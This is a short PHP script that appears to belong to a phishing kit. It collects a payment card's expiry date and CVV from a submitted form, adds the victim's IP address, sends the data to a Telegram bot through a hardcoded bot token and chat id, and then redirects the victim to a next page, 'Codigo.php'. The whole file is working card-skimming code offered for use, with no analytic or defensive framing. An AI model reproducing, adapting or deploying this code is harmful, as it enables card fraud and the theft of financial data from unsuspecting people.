<?php

  function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  

$hostname = gethostbyaddr($ip);

$message .= "🔥𝘕𝘌𝘞 𝘊𝘙𝘛\n";
$message .= "┌ ".$_POST['exp']."\n";
$message .= "└ ".$_POST['cvv']."\n";
$message .= "├ ".$ip."\n";

file_get_contents("https://api.telegram.org/bot5018015384:AAHsViFvaf5FjdHFfqg1l4u6clcYVQMLf3A/sendMessage?chat_id=-732732896&text=" . urlencode($message)."" );


echo '<script language="Javascript">
<!--
document.location.replace("Codigo.php");
// -->
</script>';
?>

